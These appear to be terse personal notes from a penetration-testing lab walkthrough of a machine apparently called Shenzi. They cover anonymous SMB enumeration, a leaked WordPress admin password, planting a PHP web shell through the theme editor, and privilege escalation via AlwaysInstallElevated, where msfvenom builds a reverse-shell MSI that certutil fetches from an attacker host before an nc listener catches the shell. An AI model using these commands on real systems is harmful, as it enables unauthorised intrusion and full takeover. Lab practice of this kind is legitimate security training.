![[Pasted image 20260709014132.png]]

![[Pasted image 20260709014159.png]]

smbclient -U '' -L //192.168.74.55

![[Pasted image 20260709014256.png]]

smbclient -U '' //192.168.74.55/shenzi

![[Pasted image 20260709014734.png]]

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357
![[Pasted image 20260709014808.png]]

/shenzi/wp-admin/

http://192.168.74.55/shenzi/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty

https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php

replace everything 404 and update the page visit the 404.php page

revshells base64 powershell

![[Pasted image 20260709021210.png]]


always elivated
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.74 LPORT=7777 --platform windows -f msi -o rshell.msi

python -m http.server 80


certutil -urlcache -split -f http://192.168.49.74/rshell.msi rshell.msi


```

msiexec /quiet /qn /i rshell.msi

nc -lnvp 7777


![[Pasted image 20260709021910.png]]
